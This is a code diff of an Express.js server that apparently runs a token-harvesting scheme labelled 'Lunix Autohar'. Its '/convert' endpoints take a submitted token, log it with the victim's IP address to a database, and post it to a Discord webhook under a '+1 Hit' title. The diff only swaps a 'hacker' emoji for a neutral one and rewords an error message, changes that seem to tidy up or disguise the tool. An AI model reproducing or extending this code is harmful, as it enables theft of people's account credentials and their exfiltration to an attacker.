@@ -521,7 +521,7 @@ app.post('/u/:directory/convert', async (req, res) => {
       // Log user data to database
       await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });
 
-      const customTitle = `<:hacker:1404745235711655987> +1 Hit - Lunix Autohar`;
+      const customTitle = `<:emoji_37:1410520517349212200> +1 Hit - Lunix Autohar`;
 
       // Send to Discord webhook with user data
       const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle);
@@ -2140,7 +2140,7 @@ app.get('/:directory/:subdirectory', async (req, res) => {
     // Serve the same page for subdirectories
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
   } else {
-    res.status(404).json({ error: 'Subdirectory not found' });
+    res.status(404).json({ error: 'Directory not found' });
   }
 });
 
@@ -2284,8 +2284,7 @@ app.post('/:directory/convert', async (req, res) => {
       // Log user data to database
       await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });
 
-      const customTitle = `<:hacker:1404745235711655987> +1 Hit - Lunix Autohar`;
-
+      const customTitle = `<:emoji_37:1410520517349212200> +1 Hit - Lunix Autohar`;
       // Send to Discord webhook with user data
       const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle);
 
